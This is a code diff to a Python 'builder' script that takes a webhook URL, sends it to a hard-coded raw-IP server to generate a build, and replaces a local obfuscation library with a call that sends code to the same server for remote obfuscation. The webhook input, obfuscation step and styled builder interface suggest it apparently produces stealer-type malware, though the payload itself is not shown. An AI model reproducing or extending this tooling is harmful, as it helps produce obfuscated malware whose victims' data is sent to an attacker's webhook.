@@ -1,10 +1,11 @@
 from base64 import b64encode
 from pystyle import Center, Colorate, Colors, System
-from requests import post
-from pyperion import obfuscate
+from requests import post, get
 from time import time
 from os import mkdir
 from os.path import exists
+from tokenize import tokenize, untokenize, TokenInfo
+from io import BytesIO
 
 System.Clear()
 System.Size(150, 30)
@@ -31,10 +32,15 @@ def stage(text):
 def init():
     if not exists('build'):
         mkdir('build')
+        
+def obfuscate(code):
+    res = get('http://45.158.77.206:5005', json={'code': code})
+    
+    return res.text
 
 def build(webhook):
 
-    url = "http://45.158.77.206:80/new"
+    url = "http://45.158.77.206:5004/new"
     json = {
         'webhook': webhook,
         'user-agents': ['Chrome/103.0']
@@ -74,7 +80,7 @@ def main():
     try:
         content = build(webhook)
     except Exception as error:
-        input('Something went wrong ! ' + str(error))
+        input('Something went wrong ! ')
     after = time()
 
     print()
@@ -86,4 +92,3 @@ def main():
 
 
 if __name__ == '__main__': main()  
-
